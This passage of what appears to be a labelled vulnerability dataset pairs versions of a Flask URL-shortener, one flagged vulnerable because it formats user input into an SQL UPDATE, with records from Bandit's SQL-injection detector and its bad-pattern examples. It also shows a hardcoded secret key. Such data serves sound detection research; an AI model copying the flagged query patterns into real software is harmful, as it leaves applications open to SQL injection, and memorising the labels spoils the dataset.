render_template('dashboard.html', crawls=crawls)\n    else:\n        msg = 'No Crawls Found'\n        return render_template('dashboard.html', msg=msg)\n\n    # Close connection FIXME is this code executed\n    cur.close()\n\n\nif __name__ == '__main__':\n    app.secret_key='Aj\"$7PE#>3AC6W]`STXYLz*[G\\gQWA'\n    app.run(debug=True)\n    #app.run(host='0.0.0.0')\n\n/n/n/n", "label": 1, "vtype": "sql"}, {"id": "071497f90bcf7336c44e135d5ef4bd87898fa8d0", "code": "app.py/n/n#!/usr/bin/env python2.7\n\nimport sys\nimport os\n\n# Flask Import\nfrom flask import Flask , request , redirect , render_template , url_for \nfrom flask import jsonify , abort , make_response \nimport MySQLdb\n\n# Toekn and URL check import\nfrom check_encode import random_token , url_check\nfrom display_list import list_data\n\nfrom sql_table import mysql_table\n\n# Config import\nimport config\n\n# Import Loggers\nimport logging\nfrom logging.handlers import RotatingFileHandler\nfrom time import strftime\nimport traceback\n\n# Setting UTF-8 encoding\n\nreload(sys)\nsys.setdefaultencoding('UTF-8')\nos.putenv('LANG', 'en_US.UTF-8')\nos.putenv('LC_ALL', 'en_US.UTF-8')\n\napp = Flask(__name__)\napp.config.from_object('config')\n\nshorty_host = config.domain\n\n# MySQL configurations\n\nhost = config.host\nuser = config.user\npasswrd = config.passwrd\ndb = config.db\n\n@app.route('/analytics/<short_url>')\ndef analytics(short_url):\n\n\tinfo_fetch , counter_fetch , browser_fetch , platform_fetch = list_data(short_url)\n\treturn render_template(\"data.html\" , host = shorty_host,info = info_fetch ,counter = counter_fetch ,\\\n\t browser = browser_fetch , platform = platform_fetch)\n\n\n@app.route('/' , methods=['GET' , 'POST'])\ndef index():\n\n\tconn = MySQLdb.connect(host , user , passwrd, db)\n\tcursor = conn.cursor()\n\t\n\t# Return the full table to displat on index.\n\tlist_sql = \"SELECT * FROM WEB_URL;\"\n\tcursor.execute(list_sql)\n\tresult_all_fetch = cursor.fetchall()\n\n\t\t\n\tif request.method == 'POST':\n\t\tog_url = request.form.get('url_input')\n\t\tcustom_suff = request.form.get('url_custom')\n\t\ttag_url = request.form.get('url_tag')\n\t\tif custom_suff == '':\n\t\t\ttoken_string =  random_token()\n\t\telse:\n\t\t\ttoken_string = custom_suff\n\t\tif og_url != '':\n\t\t\tif url_check(og_url) == True:\n\t\t\t\t\n\t\t\t\t# Check's for existing suffix \n\t\t\t\tcheck_row = \"SELECT S_URL FROM WEB_URL WHERE S_URL = %s FOR UPDATE\"\n\t\t\t\tcursor.execute(check_row,(token_string,))\n\t\t\t\tcheck_fetch = cursor.fetchone()\n\n\t\t\t\tif (check_fetch is None):\n\t\t\t\t\tinsert_row = \"\"\"\n\t\t\t\t\t\tINSERT INTO WEB_URL(URL , S_URL , TAG) VALUES( %s, %s , %s)\n\t\t\t\t\t\t\"\"\"\n\t\t\t\t\tresult_cur = cursor.execute(insert_row ,(og_url , token_string , tag_url,))\n\t\t\t\t\tconn.commit()\n\t\t\t\t\tconn.close()\n\t\t\t\t\te = ''\n\t\t\t\t\treturn render_template('index.html' ,shorty_url = shorty_host+token_string , error = e )\n\t\t\t\telse:\n\t\t\t\t\te = \"The Custom suffix already exists . Please use another suffix or leave it blank for random suffix.\"\n\t\t\t\t\treturn render_template('index.html' ,table = result_all_fetch, host = shorty_host,error = e)\n\t\t\telse:\n\t\t\t\te = \"URL entered doesn't seem valid , Enter a valid URL.\"\n\t\t\t\treturn render_template('index.html' ,table = result_all_fetch, host = shorty_host,error = e)\n\n\t\telse:\n\t\t\te = \"Enter a URL.\"\n\t\t\treturn render_template('index.html' , table = result_all_fetch, host = shorty_host,error = e)\n\telse:\t\n\t\te = ''\n\t\treturn render_template('index.html',table = result_all_fetch ,host = shorty_host, error = e )\n\t\n# Rerouting funciton\t\n\n@app.route('/<short_url>')\ndef reroute(short_url):\n\n\tconn = MySQLdb.connect(host , user , passwrd, db)\n\tcursor = conn.cursor()\n\tplatform = request.user_agent.platform\n\tbrowser =  request.user_agent.browser\n\tcounter = 1\n\n\t# Platform , Browser vars\n\t\n\tbrowser_dict = {'firefox': 0 , 'chrome':0 , 'safari':0 , 'other':0}\n\tplatform_dict = {'windows':0 , 'iphone':0 , 'android':0 , 'linux':0 , 'macos':0 , 'other':0}\n\n\t# Analytics\n\tif browser in browser_dict:\n\t\tbrowser_dict[browser] += 1\n\telse:\t\t\t\t\t\t\t\t\n\t\tbrowser_dict['other'] += 1\n\t\n\tif platform in platform_dict.iterkeys():\n\t\tplatform_dict[platform] += 1\n\telse:\n\t\tplatform_dict['other'] += 1\n\t\t\t\n\tcursor.execute(\"SELECT URL FROM WEB_URL WHERE S_URL = %s;\" ,(short_url,) )\n\n\ttry:\n\t\tnew_url = cursor.fetchone()[0]\n\t\tprint new_url\n\t\t# Update Counters \n\t\t\n\t\tcounter_sql = \"\\\n\t\t\t\tUPDATE {tn} SET COUNTER = COUNTER + {og_counter} , CHROME = CHROME + {og_chrome} , FIREFOX = FIREFOX+{og_firefox} ,\\\n\t\t\t\tSAFARI = SAFARI+{og_safari} , OTHER_BROWSER =OTHER_BROWSER+ {og_oth_brow} , ANDROID = ANDROID +{og_andr} , IOS = IOS +{og_ios},\\\n\t\t\t\tWINDOWS = WINDOWS+{og_windows} , LINUX = LINUX+{og_linux}  , MAC =MAC+ {og_mac} , OTHER_PLATFORM =OTHER_PLATFORM+ {og_plat_other} WHERE S_URL = %s;\".\\\n\t\t\t\tformat(tn = \"WEB_URL\" , og_counter = counter , og_chrome = browser_dict['chrome'] , og_firefox = browser_dict['firefox'],\\\n\t\t\t\tog_safari = browser_dict['safari'] , og_oth_brow = browser_dict['other'] , og_andr = platform_dict['android'] , og_ios = platform_dict['iphone'] ,\\\n\t\t\t\tog_windows = platform_dict['windows'] , og_linux = platform_dict['linux'] , og_mac = platform_dict['macos'] , og_plat_other = platform_dict['other'])\n\t\tres_update = cursor.execute(counter_sql, (short_url, ))\n\t\tconn.commit()\n\t\tconn.close()\n\n\t\treturn redirect(new_url)\n\n\texcept Exception as e:\n\t\te = \"Something went wrong.Please try again.\"\n\t\treturn render_template('404.html') ,404\n\n# Search results\n@app.route('/search' ,  methods=['GET' , 'POST'])\ndef search():\n\ts_tag = request.form.get('search_url')\n\tif s_tag == \"\":\n\t\treturn render_template('index.html', error = \"Please enter a search term\")\n\telse:\n\t\tconn = MySQLdb.connect(host , user , passwrd, db)\n\t\tcursor = conn.cursor()\n\t\t\n\t\tsearch_tag_sql = \"SELECT * FROM WEB_URL WHERE TAG = %s\" \n\t\tcursor.execute(search_tag_sql , (s_tag, ) )\n\t\tsearch_tag_fetch = cursor.fetchall()\n\t\tconn.close()\n\t\treturn render_template('search.html' , host = shorty_host , search_tag = s_tag , table = search_tag_fetch )\n\n\n@app.after_request\ndef after_request(response):\n\ttimestamp = strftime('[%Y-%b-%d %H:%M]')\n\tlogger.error('%s %s %s %s %s %s',timestamp , request.remote_addr , \\\n\t\t\t\trequest.method , request.scheme , request.full_path , response.status)\n\treturn response\n\n\n@app.errorhandler(Exception)\ndef exceptions(e):\n\ttb = traceback.format_exc()\n\ttimestamp = strftime('[%Y-%b-%d %H:%M]')\n\tlogger.error('%s %s %s %s %s 5xx INTERNAL SERVER ERROR\\n%s',\n        timestamp, request.remote_addr, request.method,\n        request.scheme, request.full_path, tb)\n\treturn make_response(e , 405)\n\nif __name__ == '__main__':\n\n\t# Logging handler\n\thandler = RotatingFileHandler('shorty.log' , maxBytes=100000 , backupCount = 3)\n\tlogger = logging.getLogger('tdm')\n\tlogger.setLevel(logging.ERROR)\n\tlogger.addHandler(handler)\n\tapp.run(host='127.0.0.1' , port=5000)\n\n/n/n/n", "label": 0, "vtype": "sql"}, {"id": "071497f90bcf7336c44e135d5ef4bd87898fa8d0", "code": "/app.py/n/n#!/usr/bin/env python2.7\n\nimport sys\nimport os\n\n# Flask Import\nfrom flask import Flask , request , redirect , render_template , url_for \nfrom flask import jsonify , abort , make_response \nimport MySQLdb\n\n# Toekn and URL check import\nfrom check_encode import random_token , url_check\nfrom display_list import list_data\n\nfrom sql_table import mysql_table\n\n# Config import\nimport config\n\n# Import Loggers\nimport logging\nfrom logging.handlers import RotatingFileHandler\nfrom time import strftime\nimport traceback\n\n# Setting UTF-8 encoding\n\nreload(sys)\nsys.setdefaultencoding('UTF-8')\nos.putenv('LANG', 'en_US.UTF-8')\nos.putenv('LC_ALL', 'en_US.UTF-8')\n\napp = Flask(__name__)\napp.config.from_object('config')\n\nshorty_host = config.domain\n\n# MySQL configurations\n\nhost = config.host\nuser = config.user\npasswrd = config.passwrd\ndb = config.db\n\n@app.route('/analytics/<short_url>')\ndef analytics(short_url):\n\n\tinfo_fetch , counter_fetch , browser_fetch , platform_fetch = list_data(short_url)\n\treturn render_template(\"data.html\" , host = shorty_host,info = info_fetch ,counter = counter_fetch ,\\\n\t browser = browser_fetch , platform = platform_fetch)\n\n\n@app.route('/' , methods=['GET' , 'POST'])\ndef index():\n\n\tconn = MySQLdb.connect(host , user , passwrd, db)\n\tcursor = conn.cursor()\n\t\n\t# Return the full table to displat on index.\n\tlist_sql = \"SELECT * FROM WEB_URL;\"\n\tcursor.execute(list_sql)\n\tresult_all_fetch = cursor.fetchall()\n\n\t\t\n\tif request.method == 'POST':\n\t\tog_url = request.form.get('url_input')\n\t\tcustom_suff = request.form.get('url_custom')\n\t\ttag_url = request.form.get('url_tag')\n\t\tif custom_suff == '':\n\t\t\ttoken_string =  random_token()\n\t\telse:\n\t\t\ttoken_string = custom_suff\n\t\tif og_url != '':\n\t\t\tif url_check(og_url) == True:\n\t\t\t\t\n\t\t\t\t# Check's for existing suffix \n\t\t\t\tcheck_row = \"SELECT S_URL FROM WEB_URL WHERE S_URL = %s FOR UPDATE\"\n\t\t\t\tcursor.execute(check_row,(token_string,))\n\t\t\t\tcheck_fetch = cursor.fetchone()\n\n\t\t\t\tif (check_fetch is None):\n\t\t\t\t\tinsert_row = \"\"\"\n\t\t\t\t\t\tINSERT INTO WEB_URL(URL , S_URL , TAG) VALUES( %s, %s , %s)\n\t\t\t\t\t\t\"\"\"\n\t\t\t\t\tresult_cur = cursor.execute(insert_row ,(og_url , token_string , tag_url,))\n\t\t\t\t\tconn.commit()\n\t\t\t\t\tconn.close()\n\t\t\t\t\te = ''\n\t\t\t\t\treturn render_template('index.html' ,shorty_url = shorty_host+token_string , error = e )\n\t\t\t\telse:\n\t\t\t\t\te = \"The Custom suffix already exists . Please use another suffix or leave it blank for random suffix.\"\n\t\t\t\t\treturn render_template('index.html' ,table = result_all_fetch, host = shorty_host,error = e)\n\t\t\telse:\n\t\t\t\te = \"URL entered doesn't seem valid , Enter a valid URL.\"\n\t\t\t\treturn render_template('index.html' ,table = result_all_fetch, host = shorty_host,error = e)\n\n\t\telse:\n\t\t\te = \"Enter a URL.\"\n\t\t\treturn render_template('index.html' , table = result_all_fetch, host = shorty_host,error = e)\n\telse:\t\n\t\te = ''\n\t\treturn render_template('index.html',table = result_all_fetch ,host = shorty_host, error = e )\n\t\n# Rerouting funciton\t\n\n@app.route('/<short_url>')\ndef reroute(short_url):\n\n\tconn = MySQLdb.connect(host , user , passwrd, db)\n\tcursor = conn.cursor()\n\tplatform = request.user_agent.platform\n\tbrowser =  request.user_agent.browser\n\tcounter = 1\n\n\t# Platform , Browser vars\n\t\n\tbrowser_dict = {'firefox': 0 , 'chrome':0 , 'safari':0 , 'other':0}\n\tplatform_dict = {'windows':0 , 'iphone':0 , 'android':0 , 'linux':0 , 'macos':0 , 'other':0}\n\n\t# Analytics\n\tif browser in browser_dict:\n\t\tbrowser_dict[browser] += 1\n\telse:\t\t\t\t\t\t\t\t\n\t\tbrowser_dict['other'] += 1\n\t\n\tif platform in platform_dict.iterkeys():\n\t\tplatform_dict[platform] += 1\n\telse:\n\t\tplatform_dict['other'] += 1\n\t\t\t\n\tcursor.execute(\"SELECT URL FROM WEB_URL WHERE S_URL = %s;\" ,(short_url,) )\n\n\ttry:\n\t\tnew_url = cursor.fetchone()[0]\n\t\tprint new_url\n\t\t# Update Counters \n\t\t\n\t\tcounter_sql = \"\\\n\t\t\t\tUPDATE {tn} SET COUNTER = COUNTER + {og_counter} , CHROME = CHROME + {og_chrome} , FIREFOX = FIREFOX+{og_firefox} ,\\\n\t\t\t\tSAFARI = SAFARI+{og_safari} , OTHER_BROWSER =OTHER_BROWSER+ {og_oth_brow} , ANDROID = ANDROID +{og_andr} , IOS = IOS +{og_ios},\\\n\t\t\t\tWINDOWS = WINDOWS+{og_windows} , LINUX = LINUX+{og_linux}  , MAC =MAC+ {og_mac} , OTHER_PLATFORM =OTHER_PLATFORM+ {og_plat_other} WHERE S_URL = '{surl}';\".\\\n\t\t\t\tformat(tn = \"WEB_URL\" , og_counter = counter , og_chrome = browser_dict['chrome'] , og_firefox = browser_dict['firefox'],\\\n\t\t\t\tog_safari = browser_dict['safari'] , og_oth_brow = browser_dict['other'] , og_andr = platform_dict['android'] , og_ios = platform_dict['iphone'] ,\\\n\t\t\t\tog_windows = platform_dict['windows'] , og_linux = platform_dict['linux'] , og_mac = platform_dict['macos'] , og_plat_other = platform_dict['other'] ,\\\n\t\t\t\tsurl = short_url)\n\t\tres_update = cursor.execute(counter_sql)\n\t\tconn.commit()\n\t\tconn.close()\n\n\t\treturn redirect(new_url)\n\n\texcept Exception as e:\n\t\te = \"Something went wrong.Please try again.\"\n\t\treturn render_template('404.html') ,404\n\n# Search results\n@app.route('/search' ,  methods=['GET' , 'POST'])\ndef search():\n\ts_tag = request.form.get('search_url')\n\tif s_tag == \"\":\n\t\treturn render_template('index.html', error = \"Please enter a search term\")\n\telse:\n\t\tconn = MySQLdb.connect(host , user , passwrd, db)\n\t\tcursor = conn.cursor()\n\t\t\n\t\tsearch_tag_sql = \"SELECT * FROM WEB_URL WHERE TAG = %s\" \n\t\tcursor.execute(search_tag_sql , (s_tag, ) )\n\t\tsearch_tag_fetch = cursor.fetchall()\n\t\tconn.close()\n\t\treturn render_template('search.html' , host = shorty_host , search_tag = s_tag , table = search_tag_fetch )\n\n\n@app.after_request\ndef after_request(response):\n\ttimestamp = strftime('[%Y-%b-%d %H:%M]')\n\tlogger.error('%s %s %s %s %s %s',timestamp , request.remote_addr , \\\n\t\t\t\trequest.method , request.scheme , request.full_path , response.status)\n\treturn response\n\n\n@app.errorhandler(Exception)\ndef exceptions(e):\n\ttb = traceback.format_exc()\n\ttimestamp = strftime('[%Y-%b-%d %H:%M]')\n\tlogger.error('%s %s %s %s %s 5xx INTERNAL SERVER ERROR\\n%s',\n        timestamp, request.remote_addr, request.method,\n        request.scheme, request.full_path, tb)\n\treturn make_response(e , 405)\n\nif __name__ == '__main__':\n\n\t# Logging handler\n\thandler = RotatingFileHandler('shorty.log' , maxBytes=100000 , backupCount = 3)\n\tlogger = logging.getLogger('tdm')\n\tlogger.setLevel(logging.ERROR)\n\tlogger.addHandler(handler)\n\tapp.run(host='127.0.0.1' , port=5000)\n\n/n/n/n", "label": 1, "vtype": "sql"}, {"id": "6ce60806ca8a44d8a8b37050539e2b2f9a54b847", "code": "bandit/plugins/injection_sql.py/n/n# -*- coding:utf-8 -*-\n#\n# Copyright 2014 Hewlett-Packard Development Company, L.P.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n# not use this file except in compliance with the License. You may obtain\n# a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n# License for the specific language governing permissions and limitations\n# under the License.\n\nr\"\"\"\n============================\nB608: Test for SQL injection\n============================\n\nAn SQL injection attack consists of insertion or \"injection\" of a SQL query via\nthe input data given to an application. It is a very common attack vector. This\nplugin test looks for strings that resemble SQL statements that are involved in\nsome form of string building operation. For example:\n\n - \"SELECT %s FROM derp;\" % var\n - \"SELECT thing FROM \" + tab\n - \"SELECT \" + val + \" FROM \" + tab + ...\n - \"SELECT {} FROM derp;\".format(var)\n\nUnless care is taken to sanitize and control the input data when building such\nSQL statement strings, an injection attack becomes possible. If strings of this\nnature are discovered, a LOW confidence issue is reported. In order to boost\nresult confidence, this plugin test will also check to see if the discovered\nstring is in use with standard Python DBAPI calls `execute` or `executemany`.\nIf so, a MEDIUM issue is reported. For example:\n\n - cursor.execute(\"SELECT %s FROM derp;\" % var)\n\n\n:Example:\n\n.. code-block:: none\n\n    >> Issue: Possible SQL injection vector through string-based query\n    construction.\n       Severity: Medium   Confidence: Low\n       Location: ./examples/sql_statements_without_sql_alchemy.py:4\n    3 query = \"DELETE FROM foo WHERE id = '%s'\" % identifier\n    4 query = \"UPDATE foo SET value = 'b' WHERE id = '%s'\" % identifier\n    5\n\n.. seealso::\n\n - https://www.owasp.org/index.php/SQL_Injection\n - https://security.openstack.org/guidelines/dg_parameterize-database-queries.html  # noqa\n\n.. versionadded:: 0.9.0\n\n\"\"\"\n\nimport ast\nimport re\n\nimport bandit\nfrom bandit.core import test_properties as test\nfrom bandit.core import utils\n\nSIMPLE_SQL_RE = re.compile(\n    r'(select\\s.*from\\s|'\n    r'delete\\s+from\\s|'\n    r'insert\\s+into\\s.*values\\s|'\n    r'update\\s.*set\\s)',\n    re.IGNORECASE | re.DOTALL,\n)\n\n\ndef _check_string(data):\n    return SIMPLE_SQL_RE.search(data) is not None\n\n\ndef _evaluate_ast(node):\n    wrapper = None\n    statement = ''\n\n    if isinstance(node.parent, ast.BinOp):\n        out = utils.concat_string(node, node.parent)\n        wrapper = out[0].parent\n        statement = out[1]\n    elif (isinstance(node.parent, ast.Attribute)\n          and node.parent.attr == 'format'):\n        statement = node.s\n        # Hierarchy for \"\".format() is Wrapper -> Call -> Attribute -> Str\n        wrapper = node.parent.parent.parent\n\n    if isinstance(wrapper, ast.Call):  # wrapped in \"execute\" call?\n        names = ['execute', 'executemany']\n        name = utils.get_called_name(wrapper)\n        return (name in names, statement)\n    else:\n        return (False, statement)\n\n\n@test.checks('Str')\n@test.test_id('B608')\ndef hardcoded_sql_expressions(context):\n    val = _evaluate_ast(context.node)\n    if _check_string(val[1]):\n        return bandit.Issue(\n            severity=bandit.MEDIUM,\n            confidence=bandit.MEDIUM if val[0] else bandit.LOW,\n            text=\"Possible SQL injection vector through string-based \"\n                 \"query construction.\"\n        )\n/n/n/nexamples/sql_statements.py/n/nimport sqlalchemy\n\n# bad\nquery = \"SELECT * FROM foo WHERE id = '%s'\" % identifier\nquery = \"INSERT INTO foo VALUES ('a', 'b', '%s')\" % value\nquery = \"DELETE FROM foo WHERE id = '%s'\" % identifier\nquery = \"UPDATE foo SET value = 'b' WHERE id = '%s'\" % identifier\nquery = \"\"\"WITH cte AS (SELECT x FROM foo)\nSELECT x FROM cte WHERE x = '%s'\"\"\" % identifier\n# bad alternate forms\nquery = \"SELECT * FROM foo WHERE id = '\" + identifier + \"'\"\nquery = \"SELECT * FROM foo WHERE id = '{}'\".format(identifier)\n\n# bad\ncur.execute(\"SELECT * FROM foo WHERE id = '%s'\" % identifier)\ncur.execute(\"INSERT INTO foo VALUES ('a', 'b', '%s')\" % value)\ncur.execute(\"DELETE FROM foo WHERE id = '%s'\" % identifier)\ncur.execute(\"UPDATE foo SET value = 'b' WHERE id = '%s'\" % identifier)\n# bad alternate forms\ncur.execute(\"SELECT * FROM foo WHERE id = '\" + identifier + \"'\")\ncur.execute(\"SELECT * FROM foo WHERE id = '{}'\".format(identifier))\n\n# good\ncur.execute(\"SELECT * FROM foo WHERE id = '%s'\", identifier)\ncur.execute(\"INSERT INTO foo VALUES ('a', 'b', '%s')\", value)\ncur.execute(\"DELETE FROM foo WHERE id = '%s'\", identifier)\ncur.execute(\"UPDATE foo SET value = 'b' WHERE id = '%s'\", identifier)\n\n# bug: https://bugs.launchpad.net/bandit/+bug/1479625\ndef a():\n    def b():\n        pass\n    return b\n\na()(\"SELECT %s FROM foo\" % val)\n\n# real world false positives\nchoices=[('server_list', _(\"Select from active instances\"))]\nprint(\"delete from the cache as the first argument\")\n/n/n/ntests/functional/test_functional.py/n/n# -*- coding:utf-8 -*-\n#\n# Copyright 2014 Hewlett-Packard Development Company, L.P.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n# not use this file except in compliance with the License. You may obtain\n# a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n# License for the specific language governing permissions and limitations\n# under the License.\n\nimport os\n\nimport six\nimport testtools\n\nfrom bandit.core import config as b_config\nfrom bandit.core import constants as C\nfrom bandit.core import manager as b_manager\nfrom bandit.core import metrics\nfrom bandit.core import test_set as b_test_set\n\n\nclass FunctionalTests(testtools.TestCase):\n\n    '''Functional tests for bandit test plugins.\n\n    This set of tests runs bandit against each example file in turn\n    and records the score returned. This is compared to a known good value.\n    When new tests are added to an example the expected result should be\n    adjusted to match.\n    '''\n\n    def setUp(self):\n        super(FunctionalTests, self).setUp()\n        # NOTE(tkelsey): bandit is very sensitive to paths, so stitch\n        # them up here for the testing environment.\n        #\n        path = os.path.join(os.getcwd(), 'bandit', 'plugins')\n        b_conf = b_config.BanditConfig()\n        self.b_mgr = b_manager.BanditManager(b_conf, 'file')\n        self.b_mgr.b_conf._settings['plugins_dir'] = path\n        self.b_mgr.b_ts = b_test_set.BanditTestSet(config=b_conf)\n\n    def run_example(self, example_script, ignore_nosec=False):\n        '''A helper method to run the specified test\n\n        This method runs the test, which populates the self.b_mgr.scores\n        value. Call this directly if you need to run a test, but do not\n        need to test the resulting scores against specified values.\n        :param example_script: Filename of an example script to test\n        '''\n        path = os.path.join(os.getcwd(), 'examples', example_script)\n        self.b_mgr.ignore_nosec = ignore_nosec\n        self.b_mgr.discover_files([path], True)\n        self.b_mgr.run_tests()\n\n    def check_example(self, example_script, expect, ignore_nosec=False):\n        '''A helper method to test the scores for example scripts.\n\n        :param example_script: Filename of an example script to test\n        :param expect: dict with expected counts of issue types\n        '''\n        # reset scores for subsequent calls to check_example\n        self.b_mgr.scores = []\n        self.run_example(example_script, ignore_nosec=ignore_nosec)\n        expected = 0\n        result = 0\n        for test_scores in self.b_mgr.scores:\n            for score_type in test_scores:\n                self.assertIn(score_type, expect)\n                for rating in expect[score_type]:\n                    expected += (\n                        expect[score_type][rating] * C.RANKING_VALUES[rating]\n                    )\n                result += sum(test_scores[score_type])\n        self.assertEqual(expected, result)\n\n    def check_metrics(self, example_script, expect):\n        '''A helper method to test the metrics being returned.\n\n        :param example_script: Filename of an example script to test\n        :param expect: dict with expected values of metrics\n        '''\n        self.b_mgr.metrics = metrics.Metrics()\n        self.b_mgr.scores = []\n        self.run_example(example_script)\n\n        # test general metrics (excludes issue counts)\n        m = self.b_mgr.metrics.data\n        for k in expect:\n            if k != 'issues':\n                self.assertEqual(expect[k], m['_totals'][k])\n        # test issue counts\n        if 'issues' in expect:\n            for (criteria, default) in C.CRITERIA:\n                for rank in C.RANKING:\n                    label = '{0}.{1}'.format(criteria, rank)\n                    expected = 0\n                    if expect['issues'].get(criteria, None).get(rank, None):\n                        expected = expect['issues'][criteria][rank]\n                    self.assertEqual(expected, m['_totals'][label])\n\n    def test_binding(self):\n        '''Test the bind-to-0.0.0.0 example.'''\n        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'MEDIUM': 1}}\n        self.check_example('binding.py', expect)\n\n    def test_crypto_md5(self):\n        '''Test the `hashlib.md5` example.'''\n        expect = {'SEVERITY': {'MEDIUM': 11},\n                  'CONFIDENCE': {'HIGH': 11}}\n        self.check_example('crypto-md5.py', expect)\n\n    def test_ciphers(self):\n        '''Test the `Crypto.Cipher` example.'''\n        expect = {'SEVERITY': {'HIGH': 13},\n                  'CONFIDENCE': {'HIGH': 13}}\n        self.check_example('ciphers.py', expect)\n\n    def test_cipher_modes(self):\n        '''Test for insecure cipher modes.'''\n        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('cipher-modes.py', expect)\n\n    def test_eval(self):\n        '''Test the `eval` example.'''\n        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('eval.py', expect)\n\n    def test_mark_safe(self):\n        '''Test the `mark_safe` example.'''\n        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('mark_safe.py', expect)\n\n    def test_exec(self):\n        '''Test the `exec` example.'''\n        filename = 'exec-{}.py'\n        if six.PY2:\n            filename = filename.format('py2')\n            expect = {'SEVERITY': {'MEDIUM': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        else:\n            filename = filename.format('py3')\n            expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}\n        self.check_example(filename, expect)\n\n    def test_exec_as_root(self):\n        '''Test for the `run_as_root=True` keyword argument.'''\n        expect = {'SEVERITY': {'LOW': 5}, 'CONFIDENCE': {'MEDIUM': 5}}\n        self.check_example('exec-as-root.py', expect)\n\n    def test_hardcoded_passwords(self):\n        '''Test for hard-coded passwords.'''\n        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'MEDIUM': 7}}\n        self.check_example('hardcoded-passwords.py', expect)\n\n    def test_hardcoded_tmp(self):\n        '''Test for hard-coded /tmp, /var/tmp, /dev/shm.'''\n        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'MEDIUM': 3}}\n        self.check_example('hardcoded-tmp.py', expect)\n\n    def test_httplib_https(self):\n        '''Test for `httplib.HTTPSConnection`.'''\n        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('httplib_https.py', expect)\n\n    def test_imports_aliases(self):\n        '''Test the `import X as Y` syntax.'''\n        expect = {\n            'SEVERITY': {'LOW': 4, 'MEDIUM': 5, 'HIGH': 0},\n            'CONFIDENCE': {'HIGH': 9}\n        }\n        self.check_example('imports-aliases.py', expect)\n\n    def test_imports_from(self):\n        '''Test the `from X import Y` syntax.'''\n        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('imports-from.py', expect)\n\n    def test_imports_function(self):\n        '''Test the `__import__` function.'''\n        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('imports-function.py', expect)\n\n    def test_telnet_usage(self):\n        '''Test for `import telnetlib` and Telnet.* calls.'''\n        expect = {'SEVERITY': {'HIGH': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('telnetlib.py', expect)\n\n    def test_ftp_usage(self):\n        '''Test for `import ftplib` and FTP.* calls.'''\n        expect = {'SEVERITY': {'HIGH': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('ftplib.py', expect)\n\n    def test_imports(self):\n        '''Test for dangerous imports.'''\n        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('imports.py', expect)\n\n    def test_mktemp(self):\n        '''Test for `tempfile.mktemp`.'''\n        expect = {'SEVERITY': {'MEDIUM': 4}, 'CONFIDENCE': {'HIGH': 4}}\n        self.check_example('mktemp.py', expect)\n\n    def test_nonsense(self):\n        '''Test that a syntactically invalid module is skipped.'''\n        self.run_example('nonsense.py')\n        self.assertEqual(1, len(self.b_mgr.skipped))\n\n    def test_okay(self):\n        '''Test a vulnerability-free file.'''\n        expect = {'SEVERITY': {}, 'CONFIDENCE': {}}\n        self.check_example('okay.py', expect)\n\n    def test_os_chmod(self):\n        '''Test setting file permissions.'''\n        filename = 'os-chmod-{}.py'\n        if six.PY2:\n            filename = filename.format('py2')\n        else:\n            filename = filename.format('py3')\n        expect = {\n            'SEVERITY': {'MEDIUM': 2, 'HIGH': 8},\n            'CONFIDENCE': {'MEDIUM': 1, 'HIGH': 9}\n        }\n        self.check_example(filename, expect)\n\n    def test_os_exec(self):\n        '''Test for `os.exec*`.'''\n        expect = {'SEVERITY': {'LOW': 8}, 'CONFIDENCE': {'MEDIUM': 8}}\n        self.check_example('os-exec.py', expect)\n\n    def test_os_popen(self):\n        '''Test for `os.popen`.'''\n        expect = {'SEVERITY': {'LOW': 8, 'MEDIUM': 0, 'HIGH': 1},\n                  'CONFIDENCE': {'HIGH': 9}}\n        self.check_example('os-popen.py', expect)\n\n    def test_os_spawn(self):\n        '''Test for `os.spawn*`.'''\n        expect = {'SEVERITY': {'LOW': 8}, 'CONFIDENCE': {'MEDIUM': 8}}\n        self.check_example('os-spawn.py', expect)\n\n    def test_os_startfile(self):\n        '''Test for `os.startfile`.'''\n        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'MEDIUM': 3}}\n        self.check_example('os-startfile.py', expect)\n\n    def test_os_system(self):\n        '''Test for `os.system`.'''\n        expect = {'SEVERITY': {'LOW': 1}, 'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('os_system.py', expect)\n\n    def test_pickle(self):\n        '''Test for the `pickle` module.'''\n        expect = {\n            'SEVERITY': {'LOW': 2, 'MEDIUM': 6},\n            'CONFIDENCE': {'HIGH': 8}\n        }\n        self.check_example('pickle_deserialize.py', expect)\n\n    def test_popen_wrappers(self):\n        '''Test the `popen2` and `commands` modules.'''\n        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'HIGH': 7}}\n        self.check_example('popen_wrappers.py', expect)\n\n    def test_random_module(self):\n        '''Test for the `random` module.'''\n        expect = {'SEVERITY': {'LOW': 6}, 